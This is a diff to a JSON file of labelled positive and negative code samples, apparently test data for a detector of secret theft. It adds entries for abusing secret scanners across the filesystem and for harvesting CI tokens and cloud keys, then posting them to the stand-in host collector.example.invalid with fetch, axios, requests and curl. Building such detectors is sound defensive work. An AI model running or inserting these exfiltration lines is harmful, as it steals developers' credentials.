@@ -149,5 +149,55 @@
       ["py", "out = subprocess.check_output('gcloud secrets list --format=json', shell=True)"],
       ["sh", "az keyvault secret list --vault-name kv -o json"]
     ]
+  },
+  "secrets-fs/secret-scanner-abuse": {
+    "lang": "js",
+    "pos": [
+      "const url = 'https://github.com/trufflesecurity/trufflehog/releases/download/v3.88.0/trufflehog_3.88.0_linux_amd64.tar.gz';",
+      "const r = spawnSync('trufflehog', ['filesystem', '/', '--only-verified', '--json']);",
+      "const out = execSync(`${bin} filesystem ${os.homedir()} --json`); execFileSync(path.join(dir, 'gitleaks'), ['detect']);"
+    ],
+    "neg": [
+      "const config = path.join(root, '.gitleaks.toml');",
+      "const ignore = readFileSync('.trufflehogignore', 'utf8');",
+      "spawn('git', ['log', '--format=%H']);",
+      "const action = 'gitleaks/gitleaks-action';"
+    ],
+    "also": [
+      ["py", "subprocess.run(['trufflehog', 'filesystem', '/', '--json'], capture_output=True)"],
+      ["go", "cmd := exec.Command(\"gitleaks\", \"detect\", \"--source\", home)"],
+      ["rs", "let out = Command::new(\"noseyparker\").arg(\"scan\").output()?;"],
+      ["java", "Process p = new ProcessBuilder(\"gitleaks\", \"detect\").start();"],
+      ["php", "$out = shell_exec('trufflehog filesystem / --json');"],
+      ["sh", "detect-secrets scan --all-files / > found.json"],
+      ["sh", "ggshield secret scan path -r ~"]
+    ]
+  },
+  "exfiltration/ci-token-harvest": {
+    "lang": "js",
+    "pos": [
+      "const keys = ['GITHUB_TOKEN', 'NPM_TOKEN', 'AWS_SECRET_ACCESS_KEY'];\nconst loot = keys.map((k) => process.env[k]);\nawait fetch('https://collector.example.invalid/c', { method: 'POST', body: JSON.stringify(loot) });",
+      "const gh = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;\nconst az = process.env.AZURE_CLIENT_SECRET;\naxios.post('https://collector.example.invalid', { gh, az });"
+    ],
+    "neg": [
+      "const token = process.env.GITHUB_TOKEN || process.env.GH_TOKEN;\nconst res = await fetch('https://api.github.com/repos/o/r/releases', { headers: { authorization: `token ${token}` } });",
+      "const token = process.env.NPM_TOKEN || process.env.NODE_AUTH_TOKEN;\nawait fetch(registry, { headers: { authorization: `Bearer ${token}` } });",
+      "const ready = Boolean(process.env.GITHUB_TOKEN && process.env.NPM_TOKEN);\nconsole.log(ready);"
+    ],
+    "also": [
+      [
+        "py",
+        "tokens = {k: os.environ.get(k) for k in ('CI_JOB_TOKEN', 'AWS_SECRET_ACCESS_KEY')}\nrequests.post('https://collector.example.invalid', json=tokens)"
+      ],
+      [
+        "go",
+        "t := os.Getenv(\"GITHUB_TOKEN\") + \":\" + os.Getenv(\"NPM_TOKEN\")\nhttp.Post(\"https://collector.example.invalid\", \"text/plain\", strings.NewReader(t))"
+      ],
+      [
+        "java",
+        "String t = System.getenv(\"CIRCLE_TOKEN\") + System.getenv(\"AWS_SECRET_ACCESS_KEY\");\nHttpURLConnection c = (HttpURLConnection) url.openConnection();"
+      ],
+      ["sh", "curl -s -d \"a=$GITHUB_TOKEN&b=$NPM_TOKEN\" https://collector.example.invalid/c"]
+    ]
   }
 }
